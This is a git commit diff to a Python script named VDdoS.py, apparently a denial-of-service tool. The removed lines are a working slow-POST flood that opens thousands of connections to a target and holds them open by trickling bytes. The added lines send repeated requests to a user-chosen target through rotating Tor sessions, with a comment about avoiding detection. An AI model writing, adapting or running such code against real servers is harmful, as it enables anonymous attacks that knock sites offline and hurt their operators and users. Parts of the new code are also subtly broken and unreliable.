4543100f409c0cc6f091aef4c4bd1ea2c546f53d
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-17 09:56:44 +0300

    Update VDdoS.py

--- VDdoS.py
+++ VDdoS.py
@@ -18,52 +18,64 @@ print()
 import socket
 import time
 import threading
+import datetime
+import sys
 
-#---------------------------
-MAX_CONN=20000
-PORT=80
-HOST="your.fucking.host"
-PAGE="/index.php"
-#---------------------------
+from lib.color import color
+from lib.tor import Tor
 
-buf=("POST %s HTTP/1.1\r\n"
-"Host: %s\r\n"
-"Content-Length: 10000000\r\n"
-"Cookie: dklkt_dos_test\r\n"
-"\r\n" % (PAGE,HOST))
 
-socks=[]
+def main():
+    counter = 0
+    try:
+        while counter < max_attempts:
+            tor = Tor()
+            if not tor.tor_installed():
+                print u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END)
+                sys.exit(1)
+            else:
+                # Initial timestamp and increment the counter
+                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
+                counter += 1
 
-def conn_thread():
-	global socks
-	for i in range(0,MAX_CONN):
-		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-		try:
-			s.connect((HOST,PORT))
-			s.send(buf)
-			print( "Send buf OK!,conn=%d\n"%i)
-			socks.append(s)
-		except Exception,ex:
-			print( "Could not connect to server or send error:%s"%ex)
-			time.sleep(10)
-#end def
+                # Init a new Tor session
+                session = tor.new_session()
+                print u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END)
+                print u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END)
 
-def send_thread():
-	global socks
-	while True:
-		for s in socks:
-			try:
-				s.send("f")
-				#print( "send OK!")
-			except Exception,ex:
-				print( "Send Exception:%s\n"%ex)
-				socks.remove(s)
-				s.close()
-		time.sleep(1)
-#end def
+                # Getting data from the server
+                print u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target)
+                session.get(target)
+                # Putting data (omitted, maybe it makes detection easier)
+                # random_bytes = random._urandom(1490)
+                # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
+                # session.put(target, random_bytes)
+                print u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target)
 
-conn_th=threading.Thread(target=conn_thread,args=())
-send_th=threading.Thread(target=send_thread,args=())
+    except KeyboardInterrupt: pass
+    except Exception,exception:
+        print u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END)
+        print u'{}{}{}'.format(color.RED, exception, Exception, color.END)
 
-conn_th.start()
-send_th.start()
+    finally:
+        end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
+        total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
+        print u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time)
+        print u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter)
+        print u'{}[!]{} Stopping Tor...'.format(color.RED, color.END)
+        tor.stop_tor()
+        print u'{}[!]{} Exiting...\n'.format(color.RED, color.END)
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    # Processing args
+    from lib.args import *
+    args = parser.parse_args()
+    target = args.target
+    max_attempts = args.max_attempts
+    # Print help and exit when it runs without target arg
+    if not target:
+        parser.print_help(sys.stdout); sys.exit(2)
+    # Run the main execution
+    main()
